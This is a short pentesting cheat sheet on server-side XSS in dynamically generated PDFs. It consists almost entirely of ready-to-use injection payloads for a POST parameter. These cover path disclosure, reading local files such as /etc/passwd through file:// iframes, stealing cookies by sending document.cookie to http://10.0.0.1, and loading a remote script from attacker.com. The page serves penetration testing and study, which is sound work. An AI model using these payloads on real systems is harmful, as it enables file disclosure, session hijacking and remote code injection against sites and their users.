---
title: XSS with Dynamic PDF
description: If the PDF file, which is created somewhere in the website, that is reflected our payloads, we can insert malicious code.
tags:
    - XSS
    - Web
refs:
    - https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf
date: 2023-02-09
draft: false
---

## Exploitation

Here insert the payload into POST params.   
For example, assume the key is **“name”** and the value can be injected.

<div data-pagefind-ignore>

```bash
name="<img src='x' onerror=\"document.write('test')>\""
name="<script>document.write('test')</script>"

# Path disclosure
name="<img src='x' onerror=\"document.write(JSON.stringify(window.location))\">"
name="<script>document.write('<iframe src=\"'+window.location.href+'\"></iframe>')</script>"

# Read files
name="<iframe src=file:///etc/passwd width=1000px height=1000px></iframe>"
name="<iframe src=file:///var/www/html/index.php width=1000px height=1000px></iframe>"
name="<img src='x' onerror=\"document.write('<iframe src=file:///etc/passwd></iframe>')\"/>"

# Cookie hijacking
name="<img src=x onerror=\"location.href='http://10.0.0.1/?cookie='+ document.cookie\">"

# External script
name="<script src=\"http://attacker.com/test.js\"></script>"
name="<img src='x' onerror=\"document.write('<script src=\"http://10.0.0.1/test.js\"></script>')\"/>
```

</div>